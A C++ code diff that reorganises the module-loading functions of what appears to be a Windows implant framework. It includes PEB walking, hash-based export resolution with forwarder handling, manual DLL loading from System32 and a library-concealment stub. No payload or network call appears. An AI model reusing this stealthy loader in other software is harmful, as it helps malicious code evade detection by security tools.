@@ -13,6 +13,35 @@ __attribute__((used, section(".rdata"))) uint8_t sys32[] = {
 
 namespace Modules {
 
+	UINT_PTR FindSection(const char* section_name, uintptr_t base, uint32_t *size) {
+
+		uintptr_t sec_address = 0;
+		size_t name_length = MbsLength(section_name);
+
+		const auto nt_head = (PIMAGE_NT_HEADERS) (base + ((PIMAGE_DOS_HEADER) base)->e_lfanew);
+		const auto sec_head = IMAGE_FIRST_SECTION(nt_head);
+
+		for (auto i = 0; i < nt_head->FileHeader.NumberOfSections; i++) {
+			PIMAGE_SECTION_HEADER section = &sec_head[i];
+
+			if (name_length == MbsLength((char*) section->Name)) {
+				if (MemCompare(section_name, section->Name, name_length) == 0) {
+
+					if (!section->VirtualAddress) {
+						return 0;
+					}
+					if (size) {
+						*size = section->Misc.VirtualSize;
+					}
+
+					sec_address = base + section->VirtualAddress;
+				}
+			}
+		}
+
+		return sec_address;
+	}
+
     PLDR_DATA_TABLE_ENTRY FindModuleEntry(const uint32 hash) {
         const auto head = &(PEB_POINTER)->Ldr->InMemoryOrderModuleList;
 
@@ -58,25 +87,110 @@ namespace Modules {
         return address;
     }
 
-	VOID CleanupModule(EXECUTABLE *mod) {
-		HEXANE;
+    BOOL LocalLdrFindExportAddress(HMODULE base, CONST CHAR *export_name, CONST UINT16 ordinal, VOID **function) {
 
-		// NOTE: the module object and base will remain allocated in memory until manually freed (mod and mod->base).
-		if (mod) {
-			if (mod->buffer) {
-				MemSet(mod->buffer, 0, mod->buf_size);
-				ctx->win32.NtFreeVirtualMemory(NtCurrentProcess(), (VOID**) &mod->buffer, &mod->buf_size, MEM_RELEASE);
-			}
-			if (mod->local_name) {
-				MemSet(mod->local_name, 0, MAX_PATH);
-				Free(mod->local_name);
-			}
-			if (mod->cracked_name) {
-				MemSet(mod->cracked_name, 0, MAX_PATH);
-				Free(mod->cracked_name);
-			}
-		}
-	}
+        PIMAGE_SECTION_HEADER section = nullptr;
+        UINT8 buffer[MAX_PATH] = { };
+
+        LPVOID text_start = nullptr;
+        LPVOID text_end = nullptr;
+
+        if (!base || (export_name && ordinal)) {
+            return false;
+        }
+
+        PIMAGE_NT_HEADERS nt_head = RVA(PIMAGE_NT_HEADERS, base, ((PIMAGE_DOS_HEADER)base)->e_lfanew);
+        if (nt_head->Signature != IMAGE_NT_SIGNATURE) {
+            return false;
+        }
+
+		// Locate .text section
+        for (int sec_index = 0; sec_index < nt_head->FileHeader.NumberOfSections; sec_index++) {
+
+            PIMAGE_SECTION_HEADER section = ITER_SECTION_HEADER(base, sec_index);
+            UINT32 sec_hash = HashStringA((PCHAR) section->Name, MbsLength((PCHAR) section->Name));
+			UINT32 dot_text = TEXT;
+
+            if (MemCompare((LPVOID) &dot_text, (LPVOID)&sec_hash, sizeof(UINT32))) {
+                text_start = RVA(LPVOID, base, section->VirtualAddress);
+                text_end = RVA(LPVOID, text_start, section->SizeOfRawData);
+                break;
+            }
+        }
+
+        // didn't find .text (?) 
+        if (!text_start || !text_end) {
+            return false;
+        }
+
+        PIMAGE_DATA_DIRECTORY data_dire = &nt_head->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
+
+        if (data_dire->Size) {
+            CONST IMAGE_EXPORT_DIRECTORY *exports = RVA(PIMAGE_EXPORT_DIRECTORY, base, data_dire->VirtualAddress);
+            CONST UINT32 n_entries = !export_name ? exports->NumberOfFunctions : exports->NumberOfNames;
+
+            for (int entry_index = 0; entry_index < n_entries; entry_index++) {
+                UINT32 _ordinal = 0;
+                BOOL found = false;
+
+                if (export_name) {
+                    UINT32 *_name_rva = RVA(UINT32*, base, exports->AddressOfNames + entry_index * sizeof(UINT32));
+                    PCHAR name = RVA(PCHAR, base, *_name_rva);
+
+                    if (MbsCompare(name, export_name)) {
+                        found = true;
+
+                        INT16 *_ord_rva = RVA(INT16*, base, exports->AddressOfNameOrdinals + entry_index * sizeof(UINT16));
+                        _ordinal = exports->Base + *_ord_rva;
+                    }
+                } else {
+                    INT16 *_ord_rva = RVA(INT16*, base, exports->AddressOfNameOrdinals + entry_index * sizeof(INT16));
+                    _ordinal = exports->Base + *_ord_rva;
+
+                    if (_ordinal == ordinal) {
+                        found = true;
+                    }
+                }
+
+                if (found) {
+                    CONST UINT32 *function_rva = RVA(UINT32*, base, exports->AddressOfFunctions + sizeof(UINT32) * (_ordinal - exports->Base));
+                    VOID *fn_pointer = RVA(LPVOID, base, *function_rva);
+
+                    if (text_start > fn_pointer || text_end < fn_pointer) { // NOTE: this is another module...
+                        SIZE_T real_length = 0;
+
+                        for (SIZE_T i = 0; i < MbsLength((PCHAR)fn_pointer); i++) {
+                            if (((PCHAR) fn_pointer)[i] == '.') {
+                                real_length = i;
+                                break;
+                            }
+                        }
+
+                        if (real_length != 0) {
+                            CONST PCHAR found_name = (PCHAR) fn_pointer + real_length + 1;
+
+							MemSet(buffer, 0, MAX_PATH);
+                            MbsConcat((PCHAR) buffer, (PCHAR) fn_pointer);
+                            MbsConcat((PCHAR) buffer, (PCHAR) dot_dll);
+                            
+                            LDR_DATA_TABLE_ENTRY *lib_entry = FindModuleEntry(HashStringA(MbsToLower((PCHAR) buffer, found_name), real_length));
+                            if (!lib_entry || lib_entry->DllBase == base) {
+                                return false;
+                            }
+
+                            if (!LocalLdrFindExportAddress((HMODULE) lib_entry->DllBase, found_name, 0, &fn_pointer)) {
+                                return false;
+                            }
+                        }
+                    }
+
+                    *function = fn_pointer;
+                    return true;
+                }
+            }
+        }
+        return false;
+    }
 
 	// TODO: string hash module_name
 	UINT_PTR FindKernelModule(char *module_name) {
@@ -185,34 +299,63 @@ namespace Modules {
 		return (FARPROC) address;
 	} 
 
-	UINT_PTR FindSection(const char* section_name, uintptr_t base, uint32_t *size) {
+    BOOL FindModulePath(EXECUTABLE *mod, const uint32 name_hash) {
+        HEXANE;
 
-		uintptr_t sec_address = 0;
-		size_t name_length = MbsLength(section_name);
+		WCHAR filename[MAX_PATH] = { };
+		WIN32_FIND_DATAW data = { };
+		HANDLE handle = { };
+		BOOL success = false;
 
-		PIMAGE_NT_HEADERS nt_head = (PIMAGE_NT_HEADERS) (base + ((PIMAGE_DOS_HEADER) base)->e_lfanew);
-		PIMAGE_SECTION_HEADER sec_head = IMAGE_FIRST_SECTION(nt_head);
+        if (!name_hash) {
+            return false;
+        }
 
-		for (auto i = 0; i < nt_head->FileHeader.NumberOfSections; i++) {
-			PIMAGE_SECTION_HEADER section = &sec_head[i];
+        mod->local_name = (WCHAR*) Malloc(MAX_PATH);
+        if (!mod->local_name) {
+            goto defer;
+        }
 
-			if (name_length == MbsLength((char*) section->Name)) {
-				if (MemCompare(section_name, section->Name, name_length) == 0) {
+		MemCopy(B_PTR(filename), (PCHAR)sys32, sizeof(sys32));
+		WcsConcat(filename, (WCHAR*)dot_dll);
 
-					if (!section->VirtualAddress) {
-						return 0;
-					}
-					if (size) {
-						*size = section->Misc.VirtualSize;
-					}
-
-					sec_address = base + section->VirtualAddress;
-				}
-			}
+		handle = ctx->win32.FindFirstFileW(filename, &data);
+		if (INVALID_HANDLE_VALUE == handle) {
+			goto defer;
 		}
 
-		return sec_address;
-	}
+		do {
+			if (data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+				continue;
+			} else {
+				if (HashStringW(data.cFileName, WcsLength(data.cFileName)) - name_hash == 0) {
+					MemSet(filename, 0, MAX_PATH);
+					MemCopy(filename, data.cFileName, WcsLength(data.cFileName) * sizeof(WCHAR));
+				}
+			}
+		} while (ctx->win32.FindNextFileW(handle, &data) != 0);
+
+		if (!filename[0]) {
+			goto defer;
+		}
+
+		MemCopy(B_PTR(mod->local_name), (CHAR*)sys32, sizeof(sys32));
+		WcsConcat(mod->local_name, (WCHAR*)filename);
+
+        mod->cracked_name = (WCHAR*) Malloc(WcsLength(filename) * sizeof(WCHAR) + 1);
+		if (!mod->cracked_name) {
+			goto defer;
+		}
+
+		MemCopy(mod->cracked_name, filename, WcsLength(filename) * sizeof(WCHAR) + 1);
+		success = true;
+
+	defer:
+		if (handle) {
+			ctx->win32.FindClose(handle);
+		}
+        return success;
+    }
 
     VOID InsertTailList(LIST_ENTRY *CONST head, LIST_ENTRY *CONST entry) {
         PLIST_ENTRY blink = head->Blink;
@@ -280,110 +423,6 @@ namespace Modules {
     }
 
 	// TODO: needs testing
-    BOOL LocalLdrFindExportAddress(HMODULE base, CONST CHAR *export_name, CONST UINT16 ordinal, VOID **function) {
-
-        PIMAGE_SECTION_HEADER section = nullptr;
-        UINT8 buffer[MAX_PATH] = { };
-
-        LPVOID text_start = nullptr;
-        LPVOID text_end = nullptr;
-
-        if (!base || (export_name && ordinal)) {
-            return false;
-        }
-
-        PIMAGE_NT_HEADERS nt_head = RVA(PIMAGE_NT_HEADERS, base, ((PIMAGE_DOS_HEADER)base)->e_lfanew);
-        if (nt_head->Signature != IMAGE_NT_SIGNATURE) {
-            return false;
-        }
-
-		// Locate .text section
-        for (int sec_index = 0; sec_index < nt_head->FileHeader.NumberOfSections; sec_index++) {
-
-            PIMAGE_SECTION_HEADER section = ITER_SECTION_HEADER(base, sec_index);
-            UINT32 sec_hash = HashStringA((PCHAR) section->Name, MbsLength((PCHAR) section->Name));
-			UINT32 dot_text = TEXT;
-
-            if (MemCompare((LPVOID) &dot_text, (LPVOID)&sec_hash, sizeof(UINT32))) {
-                text_start = RVA(LPVOID, base, section->VirtualAddress);
-                text_end = RVA(LPVOID, text_start, section->SizeOfRawData);
-                break;
-            }
-        }
-
-        // didn't find .text (?) 
-        if (!text_start || !text_end) {
-            return false;
-        }
-
-        PIMAGE_DATA_DIRECTORY data_dire = &nt_head->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
-
-        if (data_dire->Size) {
-            CONST IMAGE_EXPORT_DIRECTORY *exports = RVA(PIMAGE_EXPORT_DIRECTORY, base, data_dire->VirtualAddress);
-            CONST UINT32 n_entries = !export_name ? exports->NumberOfFunctions : exports->NumberOfNames;
-
-            for (int entry_index = 0; entry_index < n_entries; entry_index++) {
-                UINT32 _ordinal = 0;
-                BOOL found = false;
-
-                if (export_name) {
-                    UINT32 *_name_rva = RVA(UINT32*, base, exports->AddressOfNames + entry_index * sizeof(UINT32));
-                    PCHAR name = RVA(PCHAR, base, *_name_rva);
-
-                    if (MbsCompare(name, export_name)) {
-                        found = true;
-
-                        INT16 *_ord_rva = RVA(INT16*, base, exports->AddressOfNameOrdinals + entry_index * sizeof(UINT16));
-                        _ordinal = exports->Base + *_ord_rva;
-                    }
-                } else {
-                    INT16 *_ord_rva = RVA(INT16*, base, exports->AddressOfNameOrdinals + entry_index * sizeof(INT16));
-                    _ordinal = exports->Base + *_ord_rva;
-
-                    if (_ordinal == ordinal) {
-                        found = true;
-                    }
-                }
-
-                if (found) {
-                    CONST UINT32 *function_rva = RVA(UINT32*, base, exports->AddressOfFunctions + sizeof(UINT32) * (_ordinal - exports->Base));
-                    VOID *fn_pointer = RVA(LPVOID, base, *function_rva);
-
-                    if (text_start > fn_pointer || text_end < fn_pointer) { // NOTE: this is another module...
-                        SIZE_T real_length = 0;
-
-                        for (SIZE_T i = 0; i < MbsLength((PCHAR)fn_pointer); i++) {
-                            if (((PCHAR) fn_pointer)[i] == '.') {
-                                real_length = i;
-                                break;
-                            }
-                        }
-
-                        if (real_length != 0) {
-                            CONST PCHAR found_name = (PCHAR) fn_pointer + real_length + 1;
-
-							MemSet(buffer, 0, MAX_PATH);
-                            MbsConcat((PCHAR) buffer, (PCHAR) fn_pointer);
-                            MbsConcat((PCHAR) buffer, (PCHAR) dot_dll);
-                            
-                            LDR_DATA_TABLE_ENTRY *lib_entry = FindModuleEntry(HashStringA(MbsToLower((PCHAR) buffer, found_name), real_length));
-                            if (!lib_entry || lib_entry->DllBase == base) {
-                                return false;
-                            }
-
-                            if (!LocalLdrFindExportAddress((HMODULE) lib_entry->DllBase, found_name, 0, &fn_pointer)) {
-                                return false;
-                            }
-                        }
-                    }
-
-                    *function = fn_pointer;
-                    return true;
-                }
-            }
-        }
-        return false;
-    }
 
     BOOL ResolveImports(const EXECUTABLE *mod) {
 		HEXANE; 
@@ -665,73 +704,6 @@ namespace Modules {
         return true;
     }
 
-    BOOL GetModulePath(EXECUTABLE *mod, const uint32 name_hash) {
-        HEXANE;
-
-		WCHAR filename[MAX_PATH] = { };
-		WIN32_FIND_DATAW data = { };
-		HANDLE handle = { };
-		BOOL success = false;
-
-        if (!name_hash) {
-            return false;
-        }
-
-        mod->local_name = (WCHAR*) Malloc(MAX_PATH);
-        if (!mod->local_name) {
-            goto defer;
-        }
-
-		MemCopy(B_PTR(filename), (PCHAR)sys32, sizeof(sys32));
-		WcsConcat(filename, (WCHAR*)dot_dll);
-
-		handle = ctx->win32.FindFirstFileW(filename, &data);
-		if (INVALID_HANDLE_VALUE == handle) {
-			goto defer;
-		}
-
-		do {
-			if (data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
-				continue;
-			} else {
-				if (HashStringW(data.cFileName, WcsLength(data.cFileName)) - name_hash == 0) {
-					MemSet(filename, 0, MAX_PATH);
-					MemCopy(filename, data.cFileName, WcsLength(data.cFileName) * sizeof(WCHAR));
-				}
-			}
-		} while (ctx->win32.FindNextFileW(handle, &data) != 0);
-
-		if (!filename[0]) {
-			goto defer;
-		}
-
-		MemCopy(B_PTR(mod->local_name), (CHAR*)sys32, sizeof(sys32));
-		WcsConcat(mod->local_name, (WCHAR*)filename);
-
-        mod->cracked_name = (WCHAR*) Malloc(WcsLength(filename) * sizeof(WCHAR) + 1);
-		if (!mod->cracked_name) {
-			goto defer;
-		}
-
-		MemCopy(mod->cracked_name, filename, WcsLength(filename) * sizeof(WCHAR) + 1);
-		success = true;
-
-	defer:
-		if (!success) {
-			if (mod->cracked_name) {
-				Free(mod->cracked_name);
-			}
-			if (mod->local_name) {
-				Free(mod->local_name);
-			}
-		}
-
-		if (handle) {
-			ctx->win32.FindClose(handle);
-		}
-        return success;
-    }
-
     BOOL ReadModule(EXECUTABLE *mod) {
         HEXANE;
 
@@ -760,7 +732,6 @@ namespace Modules {
         ctx->win32.NtClose(handle);
         return true;
     }
-
 
     BOOL LinkModule(EXECUTABLE *mod) {
         HEXANE;
@@ -850,7 +821,7 @@ namespace Modules {
 
         switch (LOWORD(load_type)) {
             case LoadLocalFile: {
-				if (!GetModulePath(mod, name_hash) || !ReadModule(mod)) {
+				if (!FindModulePath(mod, name_hash) || !ReadModule(mod)) {
 					goto defer;
 				}
 				break;
@@ -930,6 +901,25 @@ namespace Modules {
         return mod;
     }
 
+	VOID CleanupModule(EXECUTABLE *mod) {
+		HEXANE;
+
+		// NOTE: the module object and base will remain allocated until manually freed (mod* and mod->base).
+		if (mod) {
+			if (mod->buffer) {
+				MemSet(mod->buffer, 0, mod->buf_size);
+				ctx->win32.NtFreeVirtualMemory(NtCurrentProcess(), (VOID**) &mod->buffer, &mod->buf_size, MEM_RELEASE);
+			}
+			if (mod->local_name) {
+				MemSet(mod->local_name, 0, MAX_PATH);
+				Free(mod->local_name);
+			}
+			if (mod->cracked_name) {
+				MemSet(mod->cracked_name, 0, MAX_PATH);
+				Free(mod->cracked_name);
+			}
+		}
+	}
 
     BOOL ConcealLibrary(EXECUTABLE pdModule, BOOL bConceal) {
         // TODO:
